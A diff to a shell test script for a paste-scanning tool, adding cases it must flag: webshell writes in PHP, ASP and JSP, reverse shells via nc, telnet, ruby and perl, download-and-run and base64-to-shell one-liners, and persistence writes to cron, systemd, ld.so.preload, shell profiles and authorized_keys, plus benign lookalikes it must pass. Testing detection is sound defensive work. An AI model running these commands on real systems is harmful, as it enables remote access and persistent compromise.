@@ -11671,6 +11671,67 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
     && check "secret FP guard: ssws prose clean" "0" "0" \
     || check "secret FP guard: ssws prose clean" "0" "1"
 
+# ── cycle-233: webshell writes, revshell residuals, persistence-write expansion
+for c in \
+    'echo "<?php system($_GET[c]);?>" > /var/www/x.php' \
+    'echo <?php eval($_POST[x]);?> > x.php' \
+    'echo <%eval request("x")%> > x.asp' \
+    'echo "<%@ Page%><%eval" > x.aspx' \
+    'echo "shell_exec($_GET)" > x.php' \
+    'echo "passthru($_REQUEST)" > x.php' \
+    'echo "assert($_POST)" > x.php' \
+    'echo "Runtime.getRuntime().exec" > x.jsp' \
+    'nc -c sh 10.0.0.1 4444' 'ncat -c /bin/bash x 4444' \
+    'telnet x 4444|/bin/sh|telnet x 4445' 'telnet x 4444 | sh -i' \
+    'ruby -rsocket -e "c=TCPSocket.new(x,4444);IO.popen(\"id\")"' \
+    'perl -MIO::Socket -e "$c=IO::Socket::INET->new(x:4444)"' \
+    'powershell New-Object IO.Sockets.Socket' \
+    'powershell New-Object Net.Sockets.TcpClient' \
+    'scp user@x:/p /tmp; /tmp/p' 'rsync -avz x::m /tmp && /tmp/x' \
+    'wget http://x -O /tmp/x; /tmp/x' \
+    'echo YQ==|base64 -d|sh' 'echo YQ== | base64 -d | bash' \
+    'echo "x" > /etc/ld.so.preload' 'echo "lib.so" >> /etc/ld.so.preload' \
+    'echo cmd >> ~/.bash_profile' 'echo x > /etc/cron.d/x' \
+    'echo x >> /var/spool/cron/root' \
+    'echo x >> ~/.config/autostart/x.desktop' \
+    'cp x.service /etc/systemd/system/' 'mv x /etc/cron.d/' \
+    'install -D x /etc/init.d/x' 'echo x >> /etc/inetd.conf' \
+    'echo x >> /etc/xinetd.d/x' 'echo x >> /etc/profile' \
+    'echo x >> /etc/profile.d/x.sh' 'echo "|prog" > ~/.forward' \
+    'echo "ProxyCommand x" >> ~/.ssh/config' \
+    'curl http://x > ~/.zprofile' 'wget http://x -O /etc/profile.d/x.sh' \
+    'echo cmd >> ~/.xprofile' 'echo x >> /etc/zshrc' \
+    'echo x >> ~/.pam_environment' 'echo x >> ~/.zlogin' \
+    'cp x /root/.ssh/authorized_keys' 'tee /etc/cron.d/x' \
+    'echo x | tee ~/.bashrc' 'tee -a /etc/profile'; do
+    ./hlse_core paste "$c" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+        && check "paste: $c flagged" "0" "0" \
+        || check "paste: $c flagged" "0" "1"
+done
+for c in 'cat index.php' 'echo hello > x.php' \
+         'the system function in php uses GET' \
+         'cp .bashrc .bashrc.bak' 'cp config ~/.ssh/config.bak' \
+         'mv .bashrc /tmp/' 'install pkg; check .bashrc' \
+         'tee output.txt and check .bashrc' 'echo the bashrc file' \
+         'scp file /tmp then run it' 'rsync -av src/ dst/' \
+         'ls /etc/profile.d' 'cat /etc/profile' \
+         'cat /var/spool/cron/root' 'edit .bash_profile now' \
+         'the authorized_keys file' \
+         'nc -connect x 80' 'telnet x 80' \
+         'use telnet to show the banner' 'NC -C option help' \
+         'ruby TCPSocket example' 'perl -MData::Dumper -e1' \
+         'powershell New-Object FileInfo' \
+         'i use .php and the eval function' \
+         'check the system.php file' \
+         'asp.net eval in the request handler' \
+         'write x.php with system config' \
+         'the <% tag and eval function' 'echo print to x.php' \
+         'cat page.asp code' 'the request eval in aspx'; do
+    ./hlse_core paste "$c" 2>&1 | grep -q '^OK' \
+        && check "paste FP guard: $c clean" "0" "0" \
+        || check "paste FP guard: $c clean" "0" "1"
+done
+
 # ── cycle-232: package-manager remote installs + config mgmt + scheme/ext residuals
 for c in \
     'npm i http://evil/p.tgz' 'npm install git+ssh://x' \
